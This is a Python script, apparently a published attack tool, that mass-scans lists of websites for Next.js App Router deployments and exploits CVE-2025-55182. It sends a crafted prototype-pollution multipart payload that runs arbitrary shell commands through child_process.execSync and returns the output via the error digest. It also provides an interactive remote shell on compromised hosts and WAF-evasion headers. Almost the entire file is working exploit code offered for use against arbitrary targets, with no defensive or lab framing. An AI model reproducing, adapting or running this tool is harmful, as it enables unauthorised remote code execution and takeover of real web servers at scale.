#!/usr/bin/env python3
import requests
import re
import json
import base64
import argparse
import sys
import urllib3
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREY = '\033[90m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_banner():
    banner = rf"""
{Colors.CYAN}    _   __          __  ____            
   / | / /__  _  __/ /_/ __ \________   
  /  |/ / _ \| |/_/ __/ /_/ / ___/ _ \  
 / /|  /  __/>  </ /_/ _, _/ /__/  __/  
/_/ |_/\___/_/|_|\__/_/ |_|\___/\___/   
{Colors.RESET}
{Colors.BOLD}   Next.js RSC Exploit Tool (CVE-2025-55182){Colors.RESET}
{Colors.GREY}   Mass Scanner & Pipeline Edition (v2.1 Fix){Colors.RESET}

{Colors.RED}   >> OPERATOR: MITSEC ( x.com/ynsmroztas ){Colors.RESET}
    """
    print(banner)

def extract_url(line):
    """
    Cleans ANSI color codes from httpx output and extracts the URL.
    """
    # 1. Remove ANSI escape sequences (color codes)
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    clean_line = ansi_escape.sub('', line)
    
    # 2. Extract URL using regex
    url_match = re.search(r'(https?://[a-zA-Z0-9.-]+(?::\d+)?(?:/[^\s]*)?)', clean_line)
    
    if url_match:
        # Strip trailing brackets often found in httpx output like [200]
        return url_match.group(1).strip()
    return None

class NextExploiter:
    def __init__(self, cmd="id", timeout=10, proxy=None, verbose=False):
        self.cmd = cmd
        self.timeout = timeout
        self.verbose = verbose
        # Real Browser User-Agent to avoid WAF blocking detection
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5"
        }
        self.proxies = {"http": proxy, "https": proxy} if proxy else None

    def scan_and_exploit(self, target_url, auto_shell=False):
        try:
            # Phase 1: Deep Detection
            try:
                r = requests.get(target_url, headers=self.headers, verify=False, timeout=self.timeout, proxies=self.proxies, allow_redirects=True)
                html = r.text
                headers = r.headers
            except Exception:
                if self.verbose:
                    print(f"{Colors.GREY}[-] {target_url} : Unreachable{Colors.RESET}")
                return False

            is_nextjs = False
            is_vulnerable_arch = False

            # --- DETECTION LOGIC IMPROVED ---
            
            # 1. Header Check
            if "Next.js" in headers.get("X-Powered-By", ""):
                is_nextjs = True

            # 2. DOM Check (Script Paths)
            if "/_next/static" in html:
                is_nextjs = True

            # 3. Architecture Check (Crucial for Exploit)
            # App Router (Vulnerable Target) uses `self.__next_f` or `window.__next_f`
            if "__next_f" in html:
                is_nextjs = True
                is_vulnerable_arch = True 
            
            # Pages Router (Legacy/Safe) uses `__NEXT_DATA__`
            if "__NEXT_DATA__" in html:
                is_nextjs = True

            # Logic Gate
            if not is_nextjs:
                return False # Not a Next.js site, skip silently to keep output clean

            if not is_vulnerable_arch:
                if self.verbose:
                    print(f"{Colors.YELLOW}[SAFE] {target_url} (Next.js Found but Legacy/Pages Router){Colors.RESET}")
                return False

            # Phase 2: Exploitation (Only if App Router Detected)
            if self.verbose:
                print(f"{Colors.CYAN}[*] {target_url} identified as App Router. Attempting exploit...{Colors.RESET}")
                
            success, _ = self.trigger_rce(target_url)
            if success and auto_shell:
                # Drop into interactive shell for the compromised host
                self.interactive_shell(target_url)
            return success

        except Exception as e:
            return False

    def trigger_rce(self, target_url, cmd=None):
        # Allow interactive commands; fall back to default
        cmd_to_run = cmd or self.cmd
        target_ep = urljoin(target_url, "/adfa")
        
        # CVE-2025-55182 Payload
        payload_template = (
            '{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":'
            '"var res=process.mainModule.require(\'child_process\').execSync(\'{cmd}\').toString(\'base64\');'
            'throw Object.assign(new Error(\'x\'),{{digest: res}});","_chunks":"$Q2",'
            '"_formData":{{"get":"$1:constructor:constructor"}}}}}}'
        )
        json_payload = payload_template.format(cmd=cmd_to_run)
        boundary = "----NextRceMitsecOps"
        
        body = (
            f'--{boundary}\r\n'
            'Content-Disposition: form-data; name="0"\r\n\r\n'
            f'{json_payload}\r\n'
            f'--{boundary}\r\n'
            'Content-Disposition: form-data; name="1"\r\n\r\n'
            '"$@0"\r\n'
            f'--{boundary}\r\n'
            'Content-Disposition: form-data; name="2"\r\n\r\n'
            '[]\r\n'
            f'--{boundary}--\r\n'
        )
        
        # Headers specifically for the attack
        attack_headers = self.headers.copy()
        attack_headers.update({
            'Next-Action': 'x', 
            'Content-Type': f'multipart/form-data; boundary={boundary}'
        })

        try:
            r = requests.post(target_ep, data=body, headers=attack_headers, verify=False, timeout=self.timeout, proxies=self.proxies)
            
            # Extract output from digest
            match = re.search(r'"digest"\s*:\s*"((?:[^"\\]|\\.)*)"', r.text)
            
            if match:
                raw_b64 = match.group(1)
                try:
                    clean_b64 = json.loads(f'"{raw_b64}"')
                    decoded = base64.b64decode(clean_b64).decode('utf-8', errors='replace').strip()
                    
                    print(f"{Colors.GREEN}[VULN] {target_url} >>> RCE SUCCESS{Colors.RESET}")
                    print(f"{Colors.GREY}       Output: {decoded}{Colors.RESET}")
                    return True, decoded
                except:
                    return False, None
            elif self.verbose:
                print(f"{Colors.BLUE}[FAIL] {target_url} (Exploit failed - WAF or Patched){Colors.RESET}")
            return False, None

        except Exception:
            return False, None

    def interactive_shell(self, target_url):
        """
        Simple interactive loop to execute arbitrary commands on a compromised target.
        Exits on EOF/CTRL+C or when user types an exit keyword.
        """
        print(f"{Colors.YELLOW}[SHELL] Connected to {target_url}. Type 'exit' to leave the shell.{Colors.RESET}")
        while True:
            try:
                cmd = input(f"{Colors.BOLD}{target_url}$ {Colors.RESET}").strip()
            except (KeyboardInterrupt, EOFError):
                print()  # newline for cleanliness
                break

            if not cmd:
                continue

            if cmd.lower() in {"exit", "quit", "q"}:
                break

            success, output = self.trigger_rce(target_url, cmd=cmd)
            if success and output is not None:
                print(f"{Colors.GREY}{output}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] Command failed or blocked{Colors.RESET}")

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="NextRce - Mass Scanner & Exploiter")
    parser.add_argument("-l", "--list", help="File containing list of URLs")
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-c", "--cmd", default="id", help="Command to execute (default: id)")
    parser.add_argument("-t", "--threads", type=int, default=30, help="Number of threads (default: 30)")
    parser.add_argument("-p", "--proxy", help="HTTP Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show failed attempts and non-vulnerable targets")
    parser.add_argument("-i", "--shell", action="store_true", help="Drop into interactive shell after first successful exploit")
    
    args = parser.parse_args()
    
    targets = []

    # Input Handling: Check for Pipe, File, or Single Argument
    if args.url:
        targets.append(args.url)
    elif args.list:
        try:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Error: File not found.{Colors.RESET}")
            sys.exit(1)
    elif not sys.stdin.isatty():
        # Pipeline Mode (stdin) - Fixed for httpx output
        print(f"{Colors.CYAN}[*] Reading targets from pipeline (stdin)...{Colors.RESET}")
        for line in sys.stdin:
            clean_url = extract_url(line)
            if clean_url:
                targets.append(clean_url)
    else:
        print(f"{Colors.YELLOW}[!] Usage: cat urls.txt | python3 nextrce.py OR python3 nextrce.py -u <url>{Colors.RESET}")
        sys.exit(1)

    print(f"{Colors.BLUE}[*] Loaded {len(targets)} targets. Starting scan with {args.threads} threads...{Colors.RESET}")
    print(f"{Colors.GREY}[*] Payload Command: {args.cmd}{Colors.RESET}\n")

    scanner = NextExploiter(cmd=args.cmd, timeout=8, proxy=args.proxy, verbose=args.verbose)

    # Interactive mode triggers only when explicitly requested
    interactive_mode = args.shell

    if interactive_mode:
        # Run sequentially to avoid input clashes with threadpool
        for target in targets:
            success = scanner.scan_and_exploit(target, auto_shell=True)
            if success:
                break  # stop after first successful exploit + shell
        return

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(scanner.scan_and_exploit, targets)

    print(f"\n{Colors.BLUE}[*] Scan completed.{Colors.RESET}")

if __name__ == "__main__":
    main()
    
